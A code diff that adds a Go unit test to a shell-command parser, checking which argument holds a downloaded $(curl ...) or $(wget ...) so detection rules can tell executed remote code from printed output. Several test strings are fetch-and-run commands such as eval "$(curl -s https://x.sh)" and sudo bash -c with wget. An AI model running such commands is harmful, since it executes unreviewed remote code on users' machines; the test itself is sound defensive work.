@@ -309,3 +309,33 @@ func TestProgramNameIsNormalised(t *testing.T) {
 		}
 	}
 }
+
+// A $(...) that downloads is recorded against the argument it sits in, so the
+// rules can tell eval "$(curl ...)" (runs it) from  echo "$(curl ...)"  (prints it).
+func TestFetchedArgs(t *testing.T) {
+	tests := []struct {
+		line string
+		want []int
+	}{
+		{`eval "$(curl -s https://x.sh)"`, []int{0}},
+		{`sh -c "$(wget -qO- https://x.sh)"`, []int{1}},
+		{`sudo bash -c "$(\curl -s https://x.sh)"`, []int{1}},
+		{`eval "$(curl -s https://x.sh | tr a b)"`, []int{0}},
+		{`eval "$(ssh-agent -s)"`, nil},
+		{`bash deploy.sh "$(date)"`, nil},
+	}
+	for _, tc := range tests {
+		r, err := Parse(tc.line)
+		if err != nil {
+			t.Fatalf("%s: %v", tc.line, err)
+		}
+		c := find(r, strings.Fields(strings.TrimPrefix(tc.line, "sudo "))[0])
+		if c == nil {
+			t.Fatalf("%s: command not found", tc.line)
+		}
+		got := c.FetchedArgs
+		if !slices.Equal(got, tc.want) {
+			t.Errorf("%s: FetchedArgs = %v, want %v", tc.line, got, tc.want)
+		}
+	}
+}
